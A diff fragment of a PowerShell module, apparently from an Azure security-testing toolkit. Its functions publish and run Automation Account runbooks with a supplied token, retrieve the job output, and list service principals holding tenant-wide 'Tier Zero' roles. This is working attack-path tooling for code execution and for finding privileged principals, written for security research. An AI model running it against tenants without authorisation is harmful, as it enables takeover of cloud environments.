+            -Headers @{Authorization = "Bearer $($Token)"} `
+            -ContentType "application/json" `
+            -Body $($body |ConvertTo-Json -depth 5)
+
+        # Add script to the runbook
+        $URI = "$($AutomationAccountPath)/runbooks/$($RunBookName)/draft/content?api-version=2015-10-31"
+        $Request = $null
+        $Request = Invoke-RestMethod `
+            -Headers @{Authorization = "Bearer $($Token)"} `
+            -URI $URI `
+            -Method PUT `
+            -Body $Script `
+            -ContentType "text/powershell"
+
+        # Publish the runbook
+        $RequestGUID = ([GUID]::NewGuid()).toString()
+        $body = @{
+            requests = @(
+                @{
+                    httpMethod = "POST"
+                    name = $RequestGUID
+                    requestHeaderDetails = @{
+                        commandName = "Microsoft_Azure_Automation."
+                    }
+                    url = "$($AutomationAccountPath)/runbooks/$($RunBookName)/publish?api-version=2018-06-30"
+                }
+            )
+        }
+        Invoke-RestMethod `
+            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
+            -Method "POST" `
+            -Headers @{Authorization = "Bearer $($Token)"} `
+            -ContentType "application/json" `
+            -Body $($body |ConvertTo-Json -depth 3)
+    }
+    Catch {
+        $_
+    }
+}
+
+Function Get-AzureAutomationAccountRunBookOutput {
+    <#
+    .SYNOPSIS
+        Run an existing Automation Account runbook and retrieve its output
+
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+
+    .DESCRIPTION
+        Run an existing Automation Account runbook and retrieve its output
+
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the test principal
+
+    .PARAMETER RunBookName
+        The name of the runbook you want to run
+
+    .PARAMETER AutomationAccountPath
+        TThe full URL path to the Automation Account
+
+    .EXAMPLE
+        C:\PS> Get-AzureAutomationAccountRunBookOutput `
+            -Token $ARMToken `
+            -RunBookName "MyCoolRunBook" `
+            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
+
+        Description
+        -----------
+        Publish a new runbook to an existing automation account called "MyCoolAutomationAccount"
+
+    .LINK
+        https://medium.com/p/74aee1006f48
+        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $AutomationAccountPath,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $RunBookName
+    )
+    
+    Try {
+        $GUID = New-GUID
+        $Body = @{
+            requests = @(
+                @{
+                    content = @{
+                        properties = @{
+                            parameters = @{
+                                }
+                        runbook = @{
+                            name = $RunBookName
+                        }
+                        runOn = ""
+                        }
+                    }
+                    httpMethod = "PUT"
+                    name = (New-GUID).GUID
+                    requestHeaderDetails = @{
+                        commandName = "Microsoft_Azure_Automation."
+                    }
+                    url = "$($AutomationAccountPath)/jobs/$($GUID)?api-version=2017-05-15-preview"
+                }
+            )
+        }
+        $Request = Invoke-WebRequest -UseBasicParsing -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
+        -Method "POST" `
+        -WebSession $session `
+        -Headers @{
+          "Authorization"="Bearer $($Token)"
+        } `
+        -ContentType "application/json" `
+        -Body $($Body | ConvertTo-JSON -Depth 5)
+        
+        $RefreshAttempts = 0
+        Do {
+          $RunBookJobOutput = Invoke-RestMethod `
+            -Uri "$($AutomationAccountPath)/jobs/$($GUID)/output?api-version=2017-05-15-preview&_=1663548574053" `
+            -Method GET `
+            -Headers @{Authorization = "Bearer $($Token)"}
+          $RefreshAttempts++
+          Start-Sleep -s 6
+        } Until (
+            $RunBookJobOutput.Length -GT 0 -Or $RefreshAttempts -GT 10
+        )
+        
+        $RunBookJobOutput
+
+    }
+    Catch {
+        $_
+    }
+}
+
+Function Get-TierZeroServicePrincipals {
+    <#
+    .SYNOPSIS
+        Finds all Service Principals that have a Tier Zero AzureAD Admin Role or Tier Zero MS Graph App Role assignment
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Finds all Service Principals that have a Tier Zero AzureAD Admin Role or Tier Zero MS Graph App Role assignment
+    
+    .PARAMETER Token
+        A MS Graph scoped JWT for a user with the ability to read AzureAD and MS Graph app role assignments
+    
+    .EXAMPLE
+    C:\PS> Get-TierZeroServicePrincipals -Token $Token
+    
+    Description
+    -----------
+    Retrieve a list of all service principals with Tier Zero privileges
+    
+    .LINK
+        https://medium.com/p/74aee1006f48
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token
+    )
+
+    # Get Global Admin service principals:
+    $GlobalAdmins = $null 
+    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'&`$expand=principal"
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $GlobalAdmins += $Results.value
+        } else {
+            $GlobalAdmins += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+    
+    # Get Privileged Role Administrator principals:
+    $PrivRoleAdmins = $null
+    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq 'e8611ab8-c189-46e8-94e1-60213ab1f814'&`$expand=principal"
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $PrivRoleAdmins += $Results.value
+        } else {
+            $PrivRoleAdmins += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+    
+    # Get Privileged Authentication Administrator principals:
+    $PrivAuthAdmins = $null
+    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'&`$expand=principal"
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $PrivAuthAdmins += $Results.value
+        } else {
+            $PrivAuthAdmins += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+    
+    # Get Partner Tier2 Support principals:
+    $PartnerTier2Support = $null
+    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq 'e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8'&`$expand=principal"
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $PartnerTier2Support += $Results.value
+        } else {
+            $PartnerTier2Support += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+    
+    # Get the MS Graph SP
+    $URL = "https://graph.microsoft.com/v1.0/servicePrincipals/?`$filter=appId eq '00000003-0000-0000-c000-000000000000'"
+    $MSGraphSP = (Invoke-RestMethod `
+        -URI $URL `
+        -Method "GET" `
+        -Headers @{
+            Authorization = "Bearer $($Token)"
+        }).value
+    
+    # Get app roles scoped to the Graph SP
+    $MGAppRoles = $null
+    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals/$($MSGraphSP.id)/appRoleAssignedTo"
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $MGAppRoles += $Results.value
+        } else {
+            $MGAppRoles += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+    
+    $TierZeroServicePrincipals = @()
+    
+    $GlobalAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
+        $TierZeroServicePrincipal = New-Object PSObject -Property @{
+            ServicePrincipalID    = $_.id
+            TierZeroPrivilege     = "Global Administrator"
+        }
+        $TierZeroServicePrincipals += $TierZeroServicePrincipal
+    }
+    
+    $PrivRoleAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
+        $TierZeroServicePrincipal = New-Object PSObject -Property @{
+            ServicePrincipalID    = $_.id
+            TierZeroPrivilege     = "Privileged Role Administrator"
+        }
+        $TierZeroServicePrincipals += $TierZeroServicePrincipal
+    }
+    
+    $PrivAuthAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
+        $TierZeroServicePrincipal = New-Object PSObject -Property @{
+            ServicePrincipalID    = $_.id
+            TierZeroPrivilege     = "Privileged Authentication Administrator"
+        }
+        $TierZeroServicePrincipals += $TierZeroServicePrincipal
+    }
+    
+    $PartnerTier2Support | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
+        $TierZeroServicePrincipal = New-Object PSObject -Property @{
+            ServicePrincipalID    = $_.id
+            TierZeroPrivilege     = "Partner Tier2 Support"
+        }
+        $TierZeroServicePrincipals += $TierZeroServicePrincipal
+    }
+    
+    $MGAppRoles | ?{$_.appRoleId -Like "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" -And $_.principalType -Like "ServicePrincipal"} | %{
+        $TierZeroServicePrincipal = New-Object PSObject -Property @{
+            ServicePrincipalID    = $_.principalId
+            TierZeroPrivilege     = "MS Graph App Role: RoleManagement.ReadWrite.Directory"
+        }
+        $TierZeroServicePrincipals += $TierZeroServicePrincipal
+    }
+    
+    $MGAppRoles | ?{$_.appRoleId -Like "06b708a9-e830-4db3-a914-8e69da51d44f" -And $_.principalType -Like "ServicePrincipal"} | %{
+        $TierZeroServicePrincipal = New-Object PSObject -Property @{
+            ServicePrincipalID    = $_.principalId
+            TierZeroPrivilege     = "MS Graph App Role: AppRoleAssignment.ReadWrite.All"
+        }
+        $TierZeroServicePrincipals += $TierZeroServicePrincipal
+    }
+    
+    $TierZeroServicePrincipals
 }
